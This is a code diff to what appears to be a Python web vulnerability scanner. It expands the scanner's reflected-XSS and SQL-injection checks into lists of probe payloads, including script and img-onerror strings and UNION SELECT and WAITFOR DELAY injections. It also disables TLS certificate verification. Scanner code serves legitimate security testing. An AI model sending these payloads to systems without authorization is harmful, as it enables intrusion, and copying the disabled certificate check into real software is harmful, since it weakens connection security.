@@ -33,19 +33,24 @@ async def check_security_headers(target: str) -> dict | None:
 
 async def test_xss(target: str) -> dict | None:
     """Test for reflected XSS vulnerability."""
-    payload = "<script>alert('xss')</script>"
-    test_url = f"{target}{'&' if '?' in target else '?'}q={payload}"
+    payloads = [
+        "<script>alert('xss')</script>",
+        "\"><img src=x onerror=prompt(1)>",
+        "'-prompt(8)-'",
+    ]
 
     try:
-        async with httpx.AsyncClient(timeout=10, follow_redirects=True) as client:
-            response = await client.get(test_url)
+        async with httpx.AsyncClient(timeout=10, follow_redirects=True, verify=False) as client:  # nosec B501
+            for payload in payloads:
+                test_url = f"{target}{'&' if '?' in target else '?'}q={payload}"
+                response = await client.get(test_url)
 
-        if payload in response.text:
-            return {
-                "type": "Reflected XSS",
-                "description": "The target reflects unsanitized script input back into the page.",
-                "severity": "High",
-            }
+                if payload in response.text:
+                    return {
+                        "type": "Reflected XSS",
+                        "description": "The target reflects unsanitized script input back into the page.",
+                        "severity": "High",
+                    }
     except httpx.RequestError:
         return None
 
@@ -54,26 +59,32 @@ async def test_xss(target: str) -> dict | None:
 
 async def test_sqli(target: str) -> dict | None:
     """Test for basic SQL injection indicators."""
-    payload = "' OR '1'='1"
-    test_url = f"{target}{'&' if '?' in target else '?'}id={payload}"
+    payloads = [
+        "' OR '1'='1",
+        "1' ORDER BY 1--+",
+        "1' UNION SELECT NULL--",
+        "1; WAITFOR DELAY '0:0:5'",
+    ]
+
+    error_indicators = [
+        "sql syntax", "mysql", "sqlite", "postgresql",
+        "ora-", "warning", "unclosed quotation",
+        "unterminated string", "syntax error",
+    ]
 
     try:
-        async with httpx.AsyncClient(timeout=10, follow_redirects=True) as client:
-            response = await client.get(test_url)
+        async with httpx.AsyncClient(timeout=10, follow_redirects=True, verify=False) as client:  # nosec B501
+            for payload in payloads:
+                test_url = f"{target}{'&' if '?' in target else '?'}id={payload}"
+                response = await client.get(test_url)
 
-        error_indicators = [
-            "sql syntax", "mysql", "sqlite", "postgresql",
-            "ora-", "warning", "unclosed quotation",
-            "unterminated string", "syntax error",
-        ]
-
-        body_lower = response.text.lower()
-        if any(indicator in body_lower for indicator in error_indicators):
-            return {
-                "type": "SQL Injection",
-                "description": "The target shows database error messages when injected with SQL payloads.",
-                "severity": "Critical",
-            }
+                body_lower = response.text.lower()
+                if any(indicator in body_lower for indicator in error_indicators):
+                    return {
+                        "type": "SQL Injection",
+                        "description": "The target shows database error messages when injected with SQL payloads.",
+                        "severity": "Critical",
+                    }
     except httpx.RequestError:
         return None
 
